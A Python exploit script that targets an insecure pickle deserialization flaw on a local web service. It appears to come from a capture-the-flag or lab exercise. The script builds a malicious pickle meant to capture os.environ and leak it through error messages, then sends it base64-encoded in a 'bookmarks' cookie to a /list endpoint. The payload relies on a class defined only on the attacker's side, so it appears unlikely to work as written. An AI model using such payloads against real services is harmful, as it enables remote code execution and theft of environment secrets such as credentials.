import requests
import pickle
import base64
import json

target_url = "http://127.0.0.1:32962"
headers = {"User-Agent": "Mozilla/5.0"}

# Let me try a different approach - using a payload that creates
# a subclass of list with RCE in __init__

class RCEList(list):
    def __init__(self, *args, **kwargs):
        # This runs when the list is created
        import os
        self._env_data = dict(os.environ)
        # Try to make this cause an error later
        super().__init__(*args, **kwargs)
    
    def __getitem__(self, index):
        # This runs when items are accessed
        if hasattr(self, '_env_data'):
            raise RuntimeError(f"RCE_ENV: {self._env_data}")
        return super().__getitem__(index)
    
    def __iter__(self):
        # This runs when the list is iterated
        if hasattr(self, '_env_data'):
            raise RuntimeError(f"RCE_ENV_ITER: {self._env_data}")
        return super().__iter__()

class PayloadRCEList:
    def __reduce__(self):
        return (RCEList, ([],))

try:
    pickled = pickle.dumps(PayloadRCEList(), protocol=4)
    encoded = base64.b64encode(pickled).decode()
    print(f"[*] RCEList payload: {encoded}")
    
    response = requests.get(f"{target_url}/list", cookies={"bookmarks": encoded}, headers=headers, timeout=5)
    print(f"[*] Status: {response.status_code}")
    
    if response.status_code == 500:
        print(f"[!] 500 FOUND!")
        print(response.text[:3000])
except Exception as e:
    print(f"[*] Error: {e}")

# Try with property that causes RCE
